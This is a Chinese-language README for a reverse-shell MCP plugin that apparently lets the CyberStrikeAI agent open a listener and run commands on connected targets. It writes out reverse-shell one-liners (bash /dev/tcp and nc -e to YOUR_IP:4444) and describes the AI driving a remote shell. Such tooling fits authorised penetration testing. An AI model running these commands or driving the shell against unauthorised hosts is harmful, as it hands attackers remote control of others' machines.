# 反向 Shell MCP

[English](README.md)

通过**外部 MCP** 为 CyberStrikeAI 增加**反向 Shell** 能力：开启/停止 TCP 监听、与已连接目标交互执行命令，**无需修改后端代码**。

## 工具说明

| 工具 | 说明 |
|------|------|
| `reverse_shell_start_listener` | 在指定端口启动 TCP 监听，等待目标机反向连接。 |
| `reverse_shell_stop_listener` | 停止监听并断开当前客户端。 |
| `reverse_shell_status` | 查看状态：是否监听、端口、是否已连接及客户端地址。 |
| `reverse_shell_send_command` | 向已连接的反向 Shell 发送命令并返回输出。 |
| `reverse_shell_disconnect` | 仅断开当前客户端，不停止监听（可继续等待新连接）。 |

## 依赖

- Python 3.10+
- 使用项目自带 venv 时已包含 `mcp`；单独运行需：`pip install mcp`

## 在 CyberStrikeAI 中接入

1. **路径**  
   例如项目根为 `/path/to/CyberStrikeAI-main`，则脚本路径为：  
   `/path/to/CyberStrikeAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py`

2. **Web 界面** → **设置** → **外部 MCP** → **添加外部 MCP**，填入以下 JSON（将路径替换为你的实际路径）：

```json
{
  "reverse-shell": {
    "command": "/path/to/CyberStrikeAI-main/venv/bin/python3",
    "args": ["/path/to/CyberStrikeAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py"],
    "description": "反向 Shell：开启/停止监听、与目标交互执行命令",
    "timeout": 60,
    "external_mcp_enable": true
  }
}
```

   - `command`：建议使用项目 **venv** 中的 Python，或系统 `python3`。
   - `args`：**必须使用绝对路径** 指向 `mcp_reverse_shell.py`。
   - 保存后点击该 MCP 的 **启动**，即可在对话中通过 AI 调用上述工具。

3. **使用流程示例**
   - 调用 `reverse_shell_start_listener(4444)` 在 4444 端口开始监听。
   - 在目标机上执行反向连接，例如：
     - Linux: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1` 或 `nc -e /bin/sh YOUR_IP 4444`
     - 或使用 msfvenom 生成 payload 等。
   - 连接成功后，用 `reverse_shell_send_command("id")`、`reverse_shell_send_command("whoami")` 等与目标交互。
   - 需要时用 `reverse_shell_status` 查看状态，用 `reverse_shell_disconnect` 仅断开客户端，用 `reverse_shell_stop_listener` 完全停止监听。

## 本地单独运行（可选）

```bash
# 在项目根目录，使用 venv
./venv/bin/python mcp-servers/reverse_shell/mcp_reverse_shell.py
```

进程通过 stdio 与 MCP 客户端通信；CyberStrikeAI 以 stdio 方式启动该脚本时行为相同。

## 安全提示

- 仅在有授权、隔离的测试环境中使用。
- 监听在 `0.0.0.0`，若端口对外暴露存在风险，请通过防火墙或网络策略限制访问。
